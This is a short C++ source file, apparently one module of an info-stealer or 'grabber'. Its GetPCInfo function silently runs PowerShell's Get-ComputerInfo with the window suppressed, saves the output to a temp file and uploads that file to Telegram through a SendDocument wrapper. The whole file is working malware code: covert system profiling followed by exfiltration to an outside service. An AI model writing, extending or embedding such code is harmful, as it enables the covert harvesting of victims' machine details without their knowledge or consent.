#include "pch.h"
#include "../wrappers/telegram.h"
#include "getinfopc.h"
#include "../debug.h"

#include <iostream>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <vector>

namespace fs = std::filesystem;

namespace grab {
    void GetPCInfo() {
        fs::path tempPath = fs::temp_directory_path() / "pcinfo.txt";

        std::wstring command = L"powershell.exe -NoProfile -NonInteractive -Command \"Get-ComputerInfo\" > \"" + tempPath.wstring() + L"\" 2>&1";
        Debug::Log("Getting PC Information...");

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        std::vector<wchar_t> cmd(command.begin(), command.end());
        cmd.push_back(L'\0');

        if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }

        telegram::SendDocument(tempPath.string());
        Debug::Log("PC INFO: Complete");
    }
}